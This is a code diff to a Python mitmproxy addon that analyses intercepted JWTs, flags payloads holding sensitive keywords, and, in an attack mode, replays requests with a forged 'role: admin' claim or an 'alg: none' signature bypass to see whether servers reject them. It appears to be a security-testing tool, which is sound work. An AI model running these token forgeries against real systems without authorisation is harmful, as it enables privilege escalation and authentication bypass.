@@ -54,7 +54,7 @@ class JWTAnalyzer:
 
 
     def evaluateJWT(self, JWT, flow):
-        log.info("EVALUATING JWT")
+        log.debug("EVALUATING JWT")
         if JWT in JWTAnalyzer.discoveredJWTs:
             return
         
@@ -82,17 +82,22 @@ class JWTAnalyzer:
             if ctx.options.useAttackMode == True:
                 # Attack no. 1
                 sensitiveKeywords = ["password", "secret", "token", "key", "username", "email", "ssn", "role", "admin", "is_admin"]
-                lowerPayload = {
+                lowercasePayload = {
                     k.lower(): copy.deepcopy(v)
                     for k, v in unverifiedPayload.items()
                 }
 
+                log.info(lowercasePayload)
                 for keyword in sensitiveKeywords:
-                    if keyword in lowerPayload:
-                        self.Helpers.logWarning(flow, f"Potential sensitive data leakage; JWT payload contains keyword '{keyword}': {json.dumps(unverifiedHeader, indent=4)} {json.dumps(lowerPayload, indent=4)}", flow.request.url)
+                    if self.deepJSONContainsKey(lowercasePayload, keyword):
+                        self.Helpers.logWarning(flow, f"Potential sensitive data leakage; JWT payload contains keyword '{keyword}': {json.dumps(unverifiedHeader, indent=4)} {json.dumps(lowercasePayload, indent=4)}", flow.request.url)
                         
                         if keyword == "role":
-                            self.attackClaimChange(flow, JWT, "role", "admin", lowerPayload[keyword])
+                            _, currentRoleValue = self.deepJSONGetValue(lowercasePayload, keyword)
+                            if currentRoleValue != "admin":
+                                self.attackClaimChange(flow, JWT, "role", "admin", currentRoleValue)
+                            else:
+                                log.info("Skipping role change attack. Role already 'admin'")
                 
                 # Attack no. 2
                 self.attackWithAlgNone(flow, JWT)
@@ -101,6 +106,50 @@ class JWTAnalyzer:
         
         except Exception as e:
             log.exception(e)
+
+    def deepJSONContainsKey(self, JSON, keyword):
+        if isinstance(JSON, dict):
+            for k, v in JSON.items():
+                if k.lower() == keyword:
+                    return True
+                if self.deepJSONContainsKey(v, keyword):
+                    return True
+        elif isinstance(JSON, list):
+            for item in JSON:
+                if self.deepJSONContainsKey(item, keyword):
+                    return True
+        return False
+    
+    def deepJSONSetValue(self, obj, targetKey, newValue):
+        if isinstance(obj, dict):
+            for k in obj:
+                if k.lower() == targetKey.lower():
+                    obj[k] = newValue
+                    return True
+            for v in obj.values():
+                if self.deepJSONSetValue(v, targetKey, newValue):
+                    return True
+        elif isinstance(obj, list):
+            for item in obj:
+                if self.deepJSONSetValue(item, targetKey, newValue):
+                    return True
+        return False
+    
+    def deepJSONGetValue(self, obj, targetKey):
+        if isinstance(obj, dict):
+            for k, v in obj.items():
+                if k.lower() == targetKey.lower():
+                    return True, v
+                found, val = self.deepJSONGetValue(v, targetKey)
+                if found:
+                    return found, val
+        elif isinstance(obj, list):
+            for item in obj:
+                found, val = self.deepJSONGetValue(item, targetKey)
+                if found:
+                    return found, val
+        return False, None
+
 
     def attackClaimChange(self, flow, JWT, claimToChange, newClaimValue, previousClaimValue):
         log.debug(f"ATTACK: JWT claim {claimToChange} switched to {newClaimValue} from {previousClaimValue}")
@@ -111,7 +160,10 @@ class JWTAnalyzer:
             paddedPayload = payload64 + "=" * divmod(len(payload64), 4)[1]
             payloadJSON = json.loads(base64.urlsafe_b64decode(paddedPayload))
 
-            payloadJSON[claimToChange] = newClaimValue
+            modified = self.deepJSONSetValue(payloadJSON, claimToChange, newClaimValue)
+            if not modified:
+                log.warning(f"Could not find claim '{claimToChange}' in JWT to modify")
+                return None
 
             newPayloadBytes = json.dumps(payloadJSON).encode("utf-8")
             newPayload64 = base64.urlsafe_b64encode(newPayloadBytes).decode("utf-8").rstrip("=")
@@ -136,7 +188,7 @@ class JWTAnalyzer:
         ctx.master.commands.call("replay.client", [attackFlow])
 
 
-     # ATTACK: Replay request with algorithm none
+    # ATTACK: Replay request with algorithm none
     def attackWithAlgNone(self, flow, JWT):
         log.debug("ATTACK: JWT algorithm switched to none")
         JWTwithAlgNone = None
@@ -166,7 +218,7 @@ class JWTAnalyzer:
         attackFlow.request.headers["Authorization"] = f"Bearer {JWTwithAlgNone}"
 
         attackFlow.metadata["originalStatus"] = flow.response.status_code
-        log.debug(f"status_code {flow.response.status_code}")
+        log.debug(f"Status code {flow.response.status_code}")
         ctx.master.commands.call("replay.client", [attackFlow])
 
 
@@ -181,13 +233,12 @@ class JWTAnalyzer:
         path = attackFlow.request.url
 
         message = ""
-        # TODO: remove the first conditional
         if attackStatus in [401, 403, 500]:
             match attackHeader:
                 case "Active-Attack-AlgNone":
-                    message = "Rejected 'alg: none' signature bypass"
+                    message = "rejected 'alg: none' signature bypass"
                 case "Active-Attack-Claim":
-                    message = "Rejected claim change"
+                    message = "rejected claim change"
                     
             log.info(f"Server successfully {message} on {path} ({attackStatus})")
         elif attackStatus == 200 or attackStatus == originalStatus:
